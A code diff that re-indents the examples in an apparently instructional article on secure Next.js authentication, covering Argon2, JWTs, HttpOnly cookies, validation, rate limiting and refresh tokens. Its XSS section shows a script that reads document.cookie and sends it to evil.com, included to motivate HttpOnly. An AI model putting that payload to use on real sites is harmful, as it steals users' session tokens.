@@ -120,13 +120,13 @@ Its core idea is **simultaneously increasing difficulty across three dimensions*
 import { hash, verify, argon2id } from 'argon2'
 
 async function hashPassword(password: string): Promise<string> {
-	return await hash(password, {
-		type: argon2id, // Hybrid mode, balanced security and performance
-		memoryCost: 65536, // 64MB memory usage
-		timeCost: 3, // 3 iterations
-		parallelism: 4, // 4 parallel threads
-		hashLength: 32, // Output 32 bytes
-	})
+  return await hash(password, {
+    type: argon2id, // Hybrid mode, balanced security and performance
+    memoryCost: 65536, // 64MB memory usage
+    timeCost: 3, // 3 iterations
+    parallelism: 4, // 4 parallel threads
+    hashLength: 32, // Output 32 bytes
+  })
 }
 ```
 
@@ -220,24 +220,24 @@ JWT supports two signing algorithms:
 import { jwtVerify, SignJWT } from 'jose'
 
 class AuthService {
-	// Generate Token
-	async generateToken(payload: any): Promise<string> {
-		return await new SignJWT(payload)
-			.setProtectedHeader({ alg: 'RS256' }) // Must explicitly specify algorithm
-			.setIssuedAt() // Issued time
-			.setExpirationTime('7d') // Expires in 7 days
-			.sign(privateKey) // Sign with private key
-	}
+  // Generate Token
+  async generateToken(payload: any): Promise<string> {
+    return await new SignJWT(payload)
+      .setProtectedHeader({ alg: 'RS256' }) // Must explicitly specify algorithm
+      .setIssuedAt() // Issued time
+      .setExpirationTime('7d') // Expires in 7 days
+      .sign(privateKey) // Sign with private key
+  }
 
-	// Verify Token
-	async verifyToken(token: string): Promise<any> {
-		try {
-			const { payload } = await jwtVerify(token, publicKey) // Verify with public key
-			return payload
-		} catch (error) {
-			return null // Verification failed
-		}
-	}
+  // Verify Token
+  async verifyToken(token: string): Promise<any> {
+    try {
+      const { payload } = await jwtVerify(token, publicKey) // Verify with public key
+      return payload
+    } catch (error) {
+      return null // Verification failed
+    }
+  }
 }
 ```
 
@@ -284,10 +284,10 @@ XSS (Cross-Site Scripting) is a major threat to web security. Hackers inject Jav
 ```html
 <!-- Malicious comment contains this code -->
 <script>
-	// Read Token from Cookie
-	const token = document.cookie
-	// Send to hacker's server
-	fetch('https://evil.com/steal?cookie=' + token)
+  // Read Token from Cookie
+  const token = document.cookie
+  // Send to hacker's server
+  fetch('https://evil.com/steal?cookie=' + token)
 </script>
 ```
 
@@ -295,11 +295,11 @@ HttpOnly's role: Let JavaScript completely unable to read this cookie!
 
 ```typescript
 cookieStore.set('token', jwtToken, {
-	httpOnly: true, // With this, JavaScript can't read it
-	secure: true, // Only sent over HTTPS
-	sameSite: 'strict', // Prevent CSRF
-	maxAge: 7 * 24 * 60 * 60, // 7 days
-	path: '/',
+  httpOnly: true, // With this, JavaScript can't read it
+  secure: true, // Only sent over HTTPS
+  sameSite: 'strict', // Prevent CSRF
+  maxAge: 7 * 24 * 60 * 60, // 7 days
+  path: '/',
 })
 ```
 
@@ -328,24 +328,24 @@ SameSite solves this:
 import { cookies } from 'next/headers'
 
 async function login(name: string, password: string) {
-	// ... validation logic ...
+  // ... validation logic ...
 
-	// Sign JWT
-	const token = await authService.generateToken({
-		userId: user.id,
-		name: user.name,
-	})
+  // Sign JWT
+  const token = await authService.generateToken({
+    userId: user.id,
+    name: user.name,
+  })
 
-	// Set Cookie - Next.js 15 needs await
-	const cookieStore = await cookies()
+  // Set Cookie - Next.js 15 needs await
+  const cookieStore = await cookies()
 
-	cookieStore.set('auth_token', token, {
-		httpOnly: true, // Prevent XSS reading
-		secure: process.env.NODE_ENV === 'production', // HTTPS required in production
-		sameSite: 'lax', // Prevent CSRF, but allow navigation requests
-		maxAge: 60 * 60 * 24 * 7, // 7 days (in seconds)
-		path: '/', // Works site-wide
-	})
+  cookieStore.set('auth_token', token, {
+    httpOnly: true, // Prevent XSS reading
+    secure: process.env.NODE_ENV === 'production', // HTTPS required in production
+    sameSite: 'lax', // Prevent CSRF, but allow navigation requests
+    maxAge: 60 * 60 * 24 * 7, // 7 days (in seconds)
+    path: '/', // Works site-wide
+  })
 }
 ```
 
@@ -363,80 +363,80 @@ import { z } from 'zod'
 
 // Define input validation rules first
 const registerSchema = z.object({
-	name: z
-		.string()
-		.min(2, 'Username must be at least 2 characters')
-		.max(50, 'Username max 50 characters')
-		.regex(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, underscores'),
-	password: z
-		.string()
-		.min(8, 'Password must be at least 8 characters')
-		.max(128, 'Password max 128 characters')
-		.regex(/[A-Z]/, 'Password must contain uppercase letter')
-		.regex(/[a-z]/, 'Password must contain lowercase letter')
-		.regex(/[0-9]/, 'Password must contain number'),
+  name: z
+    .string()
+    .min(2, 'Username must be at least 2 characters')
+    .max(50, 'Username max 50 characters')
+    .regex(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, underscores'),
+  password: z
+    .string()
+    .min(8, 'Password must be at least 8 characters')
+    .max(128, 'Password max 128 characters')
+    .regex(/[A-Z]/, 'Password must contain uppercase letter')
+    .regex(/[a-z]/, 'Password must contain lowercase letter')
+    .regex(/[0-9]/, 'Password must contain number'),
 })
 
 class AuthService {
-	/**
-	 * Register new user
-	 */
-	async register(name: string, password: string): Promise<IDataResult<boolean>> {
-		try {
-			// 1. Input validation
-			const validationResult = registerSchema.safeParse({ name, password })
-			if (!validationResult.success) {
-				return {
-					code: -1,
-					message: validationResult.error.errors[0].message,
-					data: false,
-				}
-			}
+  /**
+   * Register new user
+   */
+  async register(name: string, password: string): Promise<IDataResult<boolean>> {
+    try {
+      // 1. Input validation
+      const validationResult = registerSchema.safeParse({ name, password })
+      if (!validationResult.success) {
+        return {
+          code: -1,
+          message: validationResult.error.errors[0].message,
+          data: false,
+        }
+      }
 
-			// 2. Check if username already exists
-			const existingUser = await this.prisma.user.findFirst({
-				where: { name },
-			})
+      // 2. Check if username already exists
+      const existingUser = await this.prisma.user.findFirst({
+        where: { name },
+      })
 
-			if (existingUser) {
-				return {
-					code: -1,
-					message: 'Username already taken',
-					data: false,
-				}
-			}
+      if (existingUser) {
+        return {
+          code: -1,
+          message: 'Username already taken',
+          data: false,
+        }
+      }
 
-			// 3. Generate secure password hash with Argon2
-			const hashedPassword = await hash(password, {
-				type: argon2id,
-				memoryCost: 65536, // 64MB
-				timeCost: 3, // 3 iterations
-				parallelism: 4, // 4 threads
-				hashLength: 32,
-			})
+      // 3. Generate secure password hash with Argon2
+      const hashedPassword = await hash(password, {
+        type: argon2id,
+        memoryCost: 65536, // 64MB
+        timeCost: 3, // 3 iterations
+        parallelism: 4, // 4 threads
+        hashLength: 32,
+      })
 
-			// 4. Create user record
-			await this.prisma.user.create({
-				data: {
-					name,
-					password: hashedPassword, // Only store hash, never plaintext!
-				},
-			})
+      // 4. Create user record
+      await this.prisma.user.create({
+        data: {
+          name,
+          password: hashedPassword, // Only store hash, never plaintext!
+        },
+      })
 
-			return {
-				code: 0,
-				message: 'Registration successful',
-				data: true,
-			}
-		} catch (error) {
-			console.error('Registration failed:', error)
-			return {
-				code: -1,
-				message: 'Registration failed, please try again later',
-				data: false,
-			}
-		}
-	}
+      return {
+        code: 0,
+        message: 'Registration successful',
+        data: true,
+      }
+    } catch (error) {
+      console.error('Registration failed:', error)
+      return {
+        code: -1,
+        message: 'Registration failed, please try again later',
+        data: false,
+      }
+    }
+  }
 }
 ```
 
@@ -446,71 +446,71 @@ The login flow needs to verify three things:
 
 ```typescript
 class AuthService {
-	/**
-	 * User login
-	 */
-	async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
-		try {
-			// 1. Find user
-			const user = await this.prisma.user.findFirst({
-				where: { name },
-			})
+  /**
+   * User login
+   */
+  async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
+    try {
+      // 1. Find user
+      const user = await this.prisma.user.findFirst({
+        where: { name },
+      })
 
-			if (!user) {
-				// Note: Return vague error message to prevent user enumeration
-				return {
-					code: -1,
-					message: 'Invalid username or password',
-					data: { user: null },
-				}
-			}
+      if (!user) {
+        // Note: Return vague error message to prevent user enumeration
+        return {
+          code: -1,
+          message: 'Invalid username or password',
+          data: { user: null },
+        }
+      }
 
-			// 2. Verify password (Argon2's verify method handles salt automatically)
-			const isPasswordValid = await verify(user.password, password)
+      // 2. Verify password (Argon2's verify method handles salt automatically)
+      const isPasswordValid = await verify(user.password, password)
 
-			if (!isPasswordValid) {
-				return {
-					code: -1,
-					message: 'Invalid username or password',
-					data: { user: null },
-				}
-			}
+      if (!isPasswordValid) {
+        return {
+          code: -1,
+          message: 'Invalid username or password',
+          data: { user: null },
+        }
+      }
 
-			// 3. Generate JWT
-			const token = await this.generateToken({
-				userId: user.id,
-				name: user.name,
-			})
+      // 3. Generate JWT
+      const token = await this.generateToken({
+        userId: user.id,
+        name: user.name,
+      })
 
-			// 4. Set Cookie
-			const cookieStore = await cookies()
-			cookieStore.set('auth_token', token, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 60 * 60 * 24 * 7, // 7 days
-				path: '/',
-			})
+      // 4. Set Cookie
+      const cookieStore = await cookies()
+      cookieStore.set('auth_token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 60 * 60 * 24 * 7, // 7 days
+        path: '/',
+      })
 
-			return {
-				code: 0,
-				message: 'Login successful',
-				data: {
-					user: {
-						id: user.id,
-						name: user.name,
-					},
-				},
-			}
-		} catch (error) {
-			console.error('Login failed:', error)
-			return {
-				code: -1,
-				message: 'Login failed, please try again later',
-				data: { user: null },
-			}
-		}
-	}
+      return {
+        code: 0,
+        message: 'Login successful',
+        data: {
+          user: {
+            id: user.id,
+            name: user.name,
+          },
+        },
+      }
+    } catch (error) {
+      console.error('Login failed:', error)
+      return {
+        code: -1,
+        message: 'Login failed, please try again later',
+        data: { user: null },
+      }
+    }
+  }
 }
 ```
 
@@ -520,32 +520,32 @@ class AuthService {
 
 ```typescript
 class AuthService {
-	/**
-	 * Get current logged-in user information
-	 */
-	async getCurrentUser(): Promise<JWTPayload | null> {
-		try {
-			const cookieStore = await cookies()
-			const token = cookieStore.get('auth_token')
+  /**
+   * Get current logged-in user information
+   */
+  async getCurrentUser(): Promise<JWTPayload | null> {
+    try {
+      const cookieStore = await cookies()
+      const token = cookieStore.get('auth_token')
 
-			if (!token) {
-				return null
-			}
+      if (!token) {
+        return null
+      }
 
-			return await this.verifyToken(token.value)
-		} catch (error) {
-			console.error('Failed to get current user:', error)
-			return null
-		}
-	}
+      return await this.verifyToken(token.value)
+    } catch (error) {
+      console.error('Failed to get current user:', error)
+      return null
+    }
+  }
 
-	/**
-	 * Check if logged in
-	 */
-	async isAuthenticated(): Promise<boolean> {
-		const user = await this.getCurrentUser()
-		return user !== null
-	}
+  /**
+   * Check if logged in
+   */
+  async isAuthenticated(): Promise<boolean> {
+    const user = await this.getCurrentUser()
+    return user !== null
+  }
 }
 ```
 
@@ -553,30 +553,30 @@ class AuthService {
 
 ```typescript
 class AuthService {
-	/**
-	 * Logout
-	 */
-	async logout(): Promise<IDataResult<boolean>> {
-		try {
-			const cookieStore = await cookies()
+  /**
+   * Logout
+   */
+  async logout(): Promise<IDataResult<boolean>> {
+    try {
+      const cookieStore = await cookies()
 
-			// Clear Cookie
-			cookieStore.delete('auth_token')
+      // Clear Cookie
+      cookieStore.delete('auth_token')
 
-			return {
-				code: 0,
-				message: 'Logged out',
-				data: true,
-			}
-		} catch (error) {
-			console.error('Logout failed:', error)
-			return {
-				code: -1,
-				message: 'Logout failed',
-				data: false,
-			}
-		}
-	}
+      return {
+        code: 0,
+        message: 'Logged out',
+        data: true,
+      }
+    } catch (error) {
+      console.error('Logout failed:', error)
+      return {
+        code: -1,
+        message: 'Logout failed',
+        data: false,
+      }
+    }
+  }
 }
 ```
 
@@ -601,34 +601,34 @@ const authService = new AuthService()
  * Register user
  */
 export async function register(formData: FormData) {
-	const name = formData.get('name') as string
-	const password = formData.get('password') as string
+  const name = formData.get('name') as string
+  const password = formData.get('password') as string
 
-	return await authService.register(name, password)
+  return await authService.register(name, password)
 }
 
 /**
  * Login user
  */
 export async function login(formData: FormData) {
-	const name = formData.get('name') as string
-	const password = formData.get('password') as string
+  const name = formData.get('name') as string
+  const password = formData.get('password') as string
 
-	return await authService.login(name, password)
+  return await authService.login(name, password)
 }
 
 /**
  * Logout
  */
 export async function logout() {
-	return await authService.logout()
+  return await authService.logout()
 }
 
 /**
  * Check auth status
  */
 export async function checkAuth() {
-	return await authService.isAuthenticated()
+  return await authService.isAuthenticated()
 }
 ```
 
@@ -647,25 +647,25 @@ The elegance of this design:
 import { register } from '@/lib/auth-actions'
 
 export default function RegisterPage() {
-	async function handleSubmit(formData: FormData) {
-		const result = await register(formData)
+  async function handleSubmit(formData: FormData) {
+    const result = await register(formData)
 
-		if (result.code === 0) {
-			// Redirect to login page
-			redirect('/login')
-		} else {
-			// Show error
-			alert(result.message)
-		}
-	}
+    if (result.code === 0) {
+      // Redirect to login page
+      redirect('/login')
+    } else {
+      // Show error
+      alert(result.message)
+    }
+  }
 
-	return (
-		<form action={handleSubmit}>
-			<input name="name" placeholder="Username" />
-			<input name="password" type="password" placeholder="Password" />
-			<button type="submit">Register</button>
-		</form>
-	)
+  return (
+    <form action={handleSubmit}>
+      <input name="name" placeholder="Username" />
+      <input name="password" type="password" placeholder="Password" />
+      <button type="submit">Register</button>
+    </form>
+  )
 }
 ```
 
@@ -678,23 +678,23 @@ import { login } from '@/lib/auth-actions'
 import { redirect } from 'next/navigation'
 
 export default function LoginPage() {
-	async function handleSubmit(formData: FormData) {
-		const result = await login(formData)
+  async function handleSubmit(formData: FormData) {
+    const result = await login(formData)
 
-		if (result.code === 0) {
-			redirect('/dashboard')
-		} else {
-			alert(result.message)
-		}
-	}
+    if (result.code === 0) {
+      redirect('/dashboard')
+    } else {
+      alert(result.message)
+    }
+  }
 
-	return (
-		<form action={handleSubmit}>
-			<input name="name" placeholder="Username" />
-			<input name="password" type="password" placeholder="Password" />
-			<button type="submit">Login</button>
-		</form>
-	)
+  return (
+    <form action={handleSubmit}>
+      <input name="name" placeholder="Username" />
+      <input name="password" type="password" placeholder="Password" />
+      <button type="submit">Login</button>
+    </form>
+  )
 }
 ```
 
@@ -711,44 +711,44 @@ import { useState, useEffect, useCallback } from 'react'
 import { checkAuth } from '@/lib/auth-actions'
 
 interface User {
-	userId: string
-	name: string
+  userId: string
+  name: string
 }
 
 export function useAuth() {
-	const [user, setUser] = useState<User | null>(null)
-	const [loading, setLoading] = useState(true)
+  const [user, setUser] = useState<User | null>(null)
+  const [loading, setLoading] = useState(true)
 
-	// Check login status
-	const checkAuthStatus = useCallback(async () => {
-		setLoading(true)
-		try {
-			const userData = await checkAuth()
-			setUser(userData)
-		} catch (error) {
-			console.error('Auth check failed:', error)
-			setUser(null)
-		} finally {
-			setLoading(false)
-		}
-	}, [])
+  // Check login status
+  const checkAuthStatus = useCallback(async () => {
+    setLoading(true)
+    try {
+      const userData = await checkAuth()
+      setUser(userData)
+    } catch (error) {
+      console.error('Auth check failed:', error)
+      setUser(null)
+    } finally {
+      setLoading(false)
+    }
+  }, [])
 
-	// Check once when component mounts
-	useEffect(() => {
-		checkAuthStatus()
-	}, [checkAuthStatus])
+  // Check once when component mounts
+  useEffect(() => {
+    checkAuthStatus()
+  }, [checkAuthStatus])
 
-	// Refresh auth status (call after login/logout)
-	const refreshAuth = useCallback(() => {
-		checkAuthStatus()
-	}, [checkAuthStatus])
+  // Refresh auth status (call after login/logout)
+  const refreshAuth = useCallback(() => {
+    checkAuthStatus()
+  }, [checkAuthStatus])
 
-	return {
-		user,
-		loading,
-		isAuthenticated: user !== null,
-		refreshAuth,
-	}
+  return {
+    user,
+    loading,
+    isAuthenticated: user !== null,
+    refreshAuth,
+  }
 }
 ```
 
@@ -762,30 +762,30 @@ import { logout } from '@/lib/auth-actions'
 import { useRouter } from 'next/navigation'
 
 export default function DashboardPage() {
-	const { user, loading, isAuthenticated, refreshAuth } = useAuth()
-	const router = useRouter()
+  const { user, loading, isAuthenticated, refreshAuth } = useAuth()
+  const router = useRouter()
 
-	async function handleLogout() {
-		await logout()
-		refreshAuth()
-		router.push('/login')
-	}
+  async function handleLogout() {
+    await logout()
+    refreshAuth()
+    router.push('/login')
+  }
 
-	if (loading) {
-		return <div className="loading">Loading...</div>
-	}
+  if (loading) {
+    return <div className="loading">Loading...</div>
+  }
 
-	if (!isAuthenticated) {
-		return <div className="not-logged-in">Please log in first</div>
-	}
+  if (!isAuthenticated) {
+    return <div className="not-logged-in">Please log in first</div>
+  }
 
-	return (
-		<div className="dashboard">
-			<h1>Welcome back, {user?.name}!</h1>
-			<p>This is your personal dashboard</p>
-			<button onClick={handleLogout}>Logout</button>
-		</div>
-	)
+  return (
+    <div className="dashboard">
+      <h1>Welcome back, {user?.name}!</h1>
+      <p>This is your personal dashboard</p>
+      <button onClick={handleLogout}>Logout</button>
+    </div>
+  )
 }
 ```
 
@@ -802,27 +802,27 @@ import { z } from 'zod'
 
 // Define validation rules
 const loginSchema = z.object({
-	name: z.string().min(1, 'Username cannot be empty').max(50, 'Username too long'),
-	password: z.string().min(6, 'Password must be at least 6 characters').max(100, 'Password too long'),
+  name: z.string().min(1, 'Username cannot be empty').max(50, 'Username too long'),
+  password: z.string().min(6, 'Password must be at least 6 characters').max(100, 'Password too long'),
 })
 
 // Use in login function
 async function login(formData: FormData) {
-	const name = formData.get('name') as string
-	const password = formData.get('password') as string
+  const name = formData.get('name') as string
+  const password = formData.get('password') as string
 
-	// Validate input
-	const result = loginSchema.safeParse({ name, password })
+  // Validate input
+  const result = loginSchema.safeParse({ name, password })
 
-	if (!result.success) {
-		return {
-			code: -1,
-			message: result.error.errors[0].message,
-			data: { user: null },
-		}
-	}
+  if (!result.success) {
+    return {
+      code: -1,
+      message: result.error.errors[0].message,
+      data: { user: null },
+    }
+  }
 
-	// Validation passed, continue with business logic
+  // Validation passed, continue with business logic
 }
 ```
 
@@ -835,43 +835,43 @@ import { RateLimiter } from 'rate-limiter-flexible'
 
 // IP-based rate limiter
 const ipRateLimiter = new RateLimiter({
-	points: 10, // 10 attempts
-	duration: 60, // within 60 seconds
-	blockDuration: 300, // blocked for 5 minutes
+  points: 10, // 10 attempts
+  duration: 60, // within 60 seconds
+  blockDuration: 300, // blocked for 5 minutes
 })
 
 // Username-based rate limiter (prevents one person from locking others' accounts)
 const usernameRateLimiter = new RateLimiter({
-	points: 5, // 5 attempts
-	duration: 900, // within 15 minutes
-	blockDuration: 900, // blocked for 15 minutes
+  points: 5, // 5 attempts
+  duration: 900, // within 15 minutes
+  blockDuration: 900, // blocked for 15 minutes
 })
 
 async function login(name: string, password: string) {
-	// Check if IP is rate limited
-	const ipKey = 'login:' + getClientIP()
-	try {
-		await ipRateLimiter.consume(ipKey)
-	} catch (error) {
-		return {
-			code: -1,
-			message: 'Too many attempts, please try again later',
-			data: { user: null },
-		}
-	}
+  // Check if IP is rate limited
+  const ipKey = 'login:' + getClientIP()
+  try {
+    await ipRateLimiter.consume(ipKey)
+  } catch (error) {
+    return {
+      code: -1,
+      message: 'Too many attempts, please try again later',
+      data: { user: null },
+    }
+  }
 
-	// Check if username is rate limited
-	try {
-		await usernameRateLimiter.consume(name)
-	} catch (error) {
-		return {
-			code: -1,
-			message: 'Too many login attempts for this account, please try again in 15 minutes',
-			data: { user: null },
-		}
-	}
+  // Check if username is rate limited
+  try {
+    await usernameRateLimiter.consume(name)
+  } catch (error) {
+    return {
+      code: -1,
+      message: 'Too many login attempts for this account, please try again in 15 minutes',
+      data: { user: null },
+    }
+  }
 
-	// Original login logic...
+  // Original login logic...
 }
 ```
 
@@ -881,64 +881,64 @@ Audit logs are the last line of defense for security. When something goes wrong,
 
 ```typescript
 class AuthService {
-	/**
-	 * Record audit log
-	 */
-	private async createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
-		try {
-			await this.prisma.auditLog.create({
-				data: {
-					action,
-					userId,
-					metadata,
-					ipAddress: getClientIP(),
-					userAgent: getUserAgent(),
-					createdAt: new Date(),
-				},
-			})
-		} catch (error) {
-			// Audit log failure shouldn't affect business flow
-			console.error('Failed to write audit log:', error)
-		}
-	}
+  /**
+   * Record audit log
+   */
+  private async createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
+    try {
+      await this.prisma.auditLog.create({
+        data: {
+          action,
+          userId,
+          metadata,
+          ipAddress: getClientIP(),
+          userAgent: getUserAgent(),
+          createdAt: new Date(),
+        },
+      })
+    } catch (error) {
+      // Audit log failure shouldn't affect business flow
+      console.error('Failed to write audit log:', error)
+    }
+  }
 
-	/**
-	 * Login (with audit)
-	 */
-	async login(name: string, password: string) {
-		try {
-			const user = await this.prisma.user.findFirst({ where: { name } })
+  /**
+   * Login (with audit)
+   */
+  async login(name: string, password: string) {
+    try {
+      const user = await this.prisma.user.findFirst({ where: { name } })
 
-			if (!user) {
-				// Record failed attempt (without revealing "user doesn't exist")
-				await this.createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
-				return { code: -1, message: 'Invalid username or password' }
-			}
+      if (!user) {
+        // Record failed attempt (without revealing "user doesn't exist")
+        await this.createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
+        return { code: -1, message: 'Invalid username or password' }
+      }
 
-			const isValid = await verify(user.password, password)
+      const isValid = await verify(user.password, password)
 
-			if (!isValid) {
-				await this.createAuditLog('LOGIN_FAILED', {
-					reason: 'wrong_password',
-					userId: user.id,
-				})
-				return { code: -1, message: 'Invalid username or password' }
-			}
+      if (!isValid) {
+        await this.createAuditLog('LOGIN_FAILED', {
+          reason: 'wrong_password',
+          userId: user.id,
+        })
+        return { code: -1, message: 'Invalid username or password' }
+      }
 
-			// Login successful
-			await this.createAuditLog('LOGIN_SUCCESS', {
-				userId: user.id,
-			})
+      // Login successful
+      await this.createAuditLog('LOGIN_SUCCESS', {
+        userId: user.id,
+      })
 
-			// Generate Token, set Cookie...
-			return { code: 0, message: 'Login successful' }
-		} catch (error) {
-			await this.createAuditLog('LOGIN_ERROR', {
-				error: (error as Error).message,
-			})
-			throw error
-		}
-	}
+      // Generate Token, set Cookie...
+      return { code: 0, message: 'Login successful' }
+    } catch (error) {
+      await this.createAuditLog('LOGIN_ERROR', {
+        error: (error as Error).message,
+      })
+      throw error
+    }
+  }
 }
 ```
 
@@ -1011,10 +1011,10 @@ Also make Refresh Token a JWT:
 
 ```typescript
 async function generateRefreshToken(userId: string): Promise<string> {
-	return await new SignJWT({ userId, type: 'refresh' })
-		.setProtectedHeader({ alg: 'RS256' })
-		.setExpirationTime('7d')
-		.sign(refreshTokenPrivateKey) // Use different key
+  return await new SignJWT({ userId, type: 'refresh' })
+    .setProtectedHeader({ alg: 'RS256' })
+    .setExpirationTime('7d')
+    .sign(refreshTokenPrivateKey) // Use different key
 }
 ```
 
@@ -1121,310 +1121,310 @@ const ACCESS_TOKEN_EXPIRY = '15m' // 15 minutes
 const REFRESH_TOKEN_EXPIRY = '7d' // 7 days
 
 class AuthService {
-	private readonly prisma: PrismaClient
+  private readonly prisma: PrismaClient
 
-	// Keys (should be loaded from environment variables in production)
-	private readonly accessTokenPrivateKey: Uint8Array
-	private readonly accessTokenPublicKey: Uint8Array
-	private readonly refreshTokenPrivateKey: Uint8Array
-	private readonly refreshTokenPublicKey: Uint8Array
+  // Keys (should be loaded from environment variables in production)
+  private readonly accessTokenPrivateKey: Uint8Array
+  private readonly accessTokenPublicKey: Uint8Array
+  private readonly refreshTokenPrivateKey: Uint8Array
+  private readonly refreshTokenPublicKey: Uint8Array
 
-	constructor() {
-		this.prisma = prisma
+  constructor() {
+    this.prisma = prisma
 
-		// Initialize keys (simplified example of string to Uint8Array)
-		// In production, load from secure key management system
-		this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
-		this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
-		this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
-		this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
-	}
+    // Initialize keys (simplified example of string to Uint8Array)
+    // In production, load from secure key management system
+    this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
+    this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
+    this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
+    this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
+  }
 
-	/**
-	 * Generate Access Token (short-lived)
-	 */
-	async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
-		return await new SignJWT(payload)
-			.setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
-			.setIssuedAt()
-			.setExpirationTime(ACCESS_TOKEN_EXPIRY)
-			.sign(this.accessTokenPrivateKey)
-	}
+  /**
+   * Generate Access Token (short-lived)
+   */
+  async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
+    return await new SignJWT(payload)
+      .setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
+      .setIssuedAt()
+      .setExpirationTime(ACCESS_TOKEN_EXPIRY)
+      .sign(this.accessTokenPrivateKey)
+  }
 
-	/**
-	 * Generate Refresh Token (JWT format + metadata storage)
-	 */
-	async generateRefreshToken(userId: string): Promise<string> {
-		// Generate unique JWT ID
-		const jti = crypto.randomUUID()
+  /**
+   * Generate Refresh Token (JWT format + metadata storage)
+   */
+  async generateRefreshToken(userId: string): Promise<string> {
+    // Generate unique JWT ID
+    const jti = crypto.randomUUID()
 
-		// Calculate expiration time
-		const expiresAt = new Date()
-		expiresAt.setDate(expiresAt.getDate() + 7)
+    // Calculate expiration time
+    const expiresAt = new Date()
+    expiresAt.setDate(expiresAt.getDate() + 7)
 
-		// Store metadata (only store jti, not the complete token)
-		await this.prisma.refreshTokenMetadata.create({
-			data: {
-				jti,
-				userId,
-				expiresAt,
-			},
-		})
+    // Store metadata (only store jti, not the complete token)
+    await this.prisma.refreshTokenMetadata.create({
+      data: {
+        jti,
+        userId,
+        expiresAt,
+      },
+    })
 
-		// Generate Refresh Token in JWT format
-		return await new SignJWT({
-			userId,
-			jti,
-			type: 'refresh',
-		})
-			.setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
-			.setIssuedAt()
-			.setExpirationTime(REFRESH_TOKEN_EXPIRY)
-			.setJti(jti)
-			.sign(this.refreshTokenPrivateKey)
-	}
+    // Generate Refresh Token in JWT format
+    return await new SignJWT({
+      userId,
+      jti,
+      type: 'refresh',
+    })
+      .setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
+      .setIssuedAt()
+      .setExpirationTime(REFRESH_TOKEN_EXPIRY)
+      .setJti(jti)
+      .sign(this.refreshTokenPrivateKey)
+  }
 
-	/**
-	 * Verify Refresh Token
-	 */
-	async verifyRefreshToken(token: string): Promise<{
-		isValid: boolean
-		userId?: string
-		jti?: string
-	}> {
-		try {
-			// 1. Verify JWT signature and expiration
-			const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
-				algorithms: [REFRESH_TOKEN_ALGORITHM],
-			})
+  /**
+   * Verify Refresh Token
+   */
+  async verifyRefreshToken(token: string): Promise<{
+    isValid: boolean
+    userId?: string
+    jti?: string
+  }> {
+    try {
+      // 1. Verify JWT signature and expiration
+      const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
+        algorithms: [REFRESH_TOKEN_ALGORITHM],
+      })
 
-			const { userId, jti, type } = payload as any
+      const { userId, jti, type } = payload as any
 
-			if (type !== 'refresh' || !userId || !jti) {
-				return { isValid: false }
-			}
+      if (type !== 'refresh' || !userId || !jti) {
+        return { isValid: false }
+      }
 
-			// 2. Check if metadata is revoked
-			const metadata = await this.prisma.refreshTokenMetadata.findUnique({
-				where: { jti },
-			})
+      // 2. Check if metadata is revoked
+      const metadata = await this.prisma.refreshTokenMetadata.findUnique({
+        where: { jti },
+      })
 
-			if (!metadata) {
-				return { isValid: false }
-			}
+      if (!metadata) {
+        return { isValid: false }
+      }
 
-			if (metadata.revoked) {
-				return { isValid: false }
-			}
+      if (metadata.revoked) {
+        return { isValid: false }
+      }
 
-			// 3. Check if expired (double check)
-			if (metadata.expiresAt < new Date()) {
-				return { isValid: false }
-			}
+      // 3. Check if expired (double check)
+      if (metadata.expiresAt < new Date()) {
+        return { isValid: false }
+      }
 
-			return { isValid: true, userId, jti }
-		} catch (error) {
-			console.error('Refresh Token verification failed:', error)
-			return { isValid: false }
-		}
-	}
+      return { isValid: true, userId, jti }
+    } catch (error) {
+      console.error('Refresh Token verification failed:', error)
+      return { isValid: false }
+    }
+  }
 
-	/**
-	 * Revoke single Refresh Token
-	 */
-	async revokeRefreshToken(jti: string): Promise<void> {
-		await this.prisma.refreshTokenMetadata.update({
-			where: { jti },
-			data: { revoked: true },
-		})
-	}
+  /**
+   * Revoke single Refresh Token
+   */
+  async revokeRefreshToken(jti: string): Promise<void> {
+    await this.prisma.refreshTokenMetadata.update({
+      where: { jti },
+      data: { revoked: true },
+    })
+  }
 
-	/**
-	 * Revoke all user's Refresh Tokens (for "logout all devices")
-	 */
-	async revokeAllUserRefreshTokens(userId: string): Promise<void> {
-		await this.prisma.refreshTokenMetadata.updateMany({
-			where: {
-				userId,
-				revoked: false,
-			},
-			data: { revoked: true },
-		})
-	}
+  /**
+   * Revoke all user's Refresh Tokens (for "logout all devices")
+   */
+  async revokeAllUserRefreshTokens(userId: string): Promise<void> {
+    await this.prisma.refreshTokenMetadata.updateMany({
+      where: {
+        userId,
+        revoked: false,
